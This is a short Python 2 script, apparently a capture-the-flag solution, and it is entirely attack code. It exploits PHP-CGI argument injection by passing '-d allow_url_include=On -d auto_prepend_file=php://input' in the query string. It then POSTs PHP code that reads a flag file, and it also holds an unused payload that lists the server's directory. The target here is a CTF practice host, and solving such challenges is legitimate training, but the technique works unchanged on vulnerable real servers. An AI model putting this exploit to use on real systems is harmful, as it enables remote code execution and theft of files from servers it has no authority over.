import urllib, urllib2, json

url = 'http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input'
req = urllib2.Request(url)

src1="""<?php
$dh = opendir("./");
while (($file = readdir($dh)) !== false) {
	echo "filename: ".$file."\n";
}
?>"""

src2="""<?php
echo file_get_contents("./flag_flag_flag.txt");
?>"""

res = urllib2.urlopen(req, src2)
text = res.read()
print text
